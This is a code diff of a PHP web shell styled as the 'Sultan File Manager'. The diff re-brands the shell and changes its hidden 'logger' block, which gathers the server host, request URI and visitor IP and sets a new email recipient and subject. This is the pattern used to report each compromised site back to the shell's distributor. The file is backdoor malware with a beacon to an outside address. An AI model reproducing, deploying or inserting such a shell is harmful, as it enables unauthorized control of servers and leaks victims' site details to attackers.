@@ -239,7 +239,7 @@ if(isset($_GET['filesrc'])){
     echo '</table>
     </div>';
 }
-echo '<br />Sultan File Manager Version <font color="red">1.1</font>, Coded By <font color="red">Raymond7</font><br />Home: <font color="red">www.tasik9etar.org</font>
+echo '<br />Sultan File Manager Version <font color="red">1.1</font>, Coded By <font color="red">Raymond7</font><br />Home: <font color="red">www.jakartablackhat.org</font>
 </BODY>
 </HTML>';
 function perms($file){
@@ -298,8 +298,8 @@ $info .= (($perms & 0x0001) ?
 <?php
 $ip = getenv("REMOTE_ADDR");
 $ra44 = rand(1, 99999);
-$subj98 = " Sultan D. Ace Logger The Revolution |$ra44";
-$email = "sultanpierr0t.1337@gmail.com";
+$subj98 = " Nacht Logger The Revolution |$ra44";
+$email = "seringdipanggilganteng@hotmail.com";
 $from = "From: Manusia Lalai <3 Shell<botv5@misterspybot.com";
 $a45 = $_SERVER['REQUEST_URI'];
 $b75 = $_SERVER['HTTP_HOST'];
